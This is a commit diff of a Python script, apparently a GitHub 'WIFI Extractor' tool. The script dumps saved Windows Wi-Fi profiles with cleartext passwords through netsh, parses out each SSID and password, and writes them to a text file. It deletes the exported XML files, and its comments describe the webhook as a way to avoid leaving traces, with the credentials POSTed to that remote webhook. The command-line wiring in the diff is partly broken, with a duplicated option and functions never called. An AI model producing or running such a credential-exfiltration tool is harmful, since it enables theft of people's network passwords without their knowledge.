3af7090cf4d9d46497ba1a37a284f0552870372f
JuanMella <juanpa_200018@hotmail.com>
2022-12-26 14:08:41 -0300

    FEAT: dinamic options

--- E_WIFI.py
+++ E_WIFI.py
@@ -1,45 +1,69 @@
-import os, sys, requests, subprocess
+import os, requests, subprocess, click
 import xml.etree.ElementTree as t
-
-#guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
-urlpost = 'your webhook url/tu direccion de webhook'
-
-#crea el archivo txt
-txt = open("Extracciones.txt", "w")
 
 #lista de exportaciones xml que genera el netsh y Wifis
 Archivos_XML_WIFI = []
 WIFIs = []
 
-#corre el comando en la command prompt
-cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
+@click.command()
+@click.option('--url', '-u', is_flag=True, default='', help='Webhook/POST URL')
+@click.option('--help', '-h', is_flag=True, help='Help')
+@click.option('--only-webhook', '-o', is_flag=True, help='Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)')
+@click.option('--only-webhook', '-o', is_flag=True, help='Version')
 
-#guarda la ruta actual
-ruta = os.getcwd()
+def help():
+    print('''
+    Wifi Extractor
+    
+    -u, --url: Webhook/POST URL (optional)
+    -h, --help: Help/Ayuda
+    -o, --only-webhook (optional): Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)
+    
+    GitHub: https://github.com/hrdax/WIFI_Extractor
+    ''')
 
-#recorre los archivos en la ruta
-for archivo in os.listdir(ruta):
-    #encuentra los archivos xml exportados y los agrega
-    if archivo.endswith(".xml"):
-        Archivos_XML_WIFI.append(archivo)
+def main():
+    #crea el archivo txt
+    txt = open("Extracciones.txt", "w")
 
-#contador para la lista de wifis
-conta = 0
+    #corre el comando en la command prompt
+    cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
 
-#recorre los archivos xml
-for archivo in Archivos_XML_WIFI:
-    tr = t.parse(archivo)
-    rt = tr.getroot()
-    ssid = rt[1][0][1].text
-    contrasena = rt[4][0][1][2].text
-    ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASEÑA/PASSWORD: {contrasena}"
-    WIFIs.append(ssid_contrasena)
-    txt.write(WIFIs[conta]+"\n")
-    conta = conta + 1
+    #guarda la ruta actual
+    ruta = os.getcwd()
 
-#ciera el archivo txt
-txt.close()
+    #recorre los archivos en la ruta
+    for archivo in os.listdir(ruta):
+        #encuentra los archivos xml exportados y los agrega
+        if archivo.endswith(".xml"):
+            Archivos_XML_WIFI.append(archivo)
 
-#envia los datos a la url de webhook
-for i in WIFIs:
-    req = requests.post(urlpost, data=i)
+    #contador para la lista de wifis
+    conta = 0
+
+    #recorre los archivos xml
+    for archivo in Archivos_XML_WIFI:
+        tr = t.parse(archivo)
+        rt = tr.getroot()
+        ssid = rt[1][0][1].text
+        contrasena = rt[4][0][1][2].text
+        ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASEÑA/PASSWORD: {contrasena}"
+        WIFIs.append(ssid_contrasena)
+        txt.write(WIFIs[conta]+"\n")
+        conta = conta + 1
+        os.remove(archivo)
+
+    #ciera el archivo txt
+    txt.close()
+
+#envia a la url de webhook si se especifica con la opcion -u
+def urlweb(url):
+    if url == '':
+        print('URL No especificada/No URL specified')
+        exit()
+    else:
+        #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
+        urlpost = url
+        #envia los datos a la url de webhook
+        for i in WIFIs:
+            requests.post(urlpost, data=i)
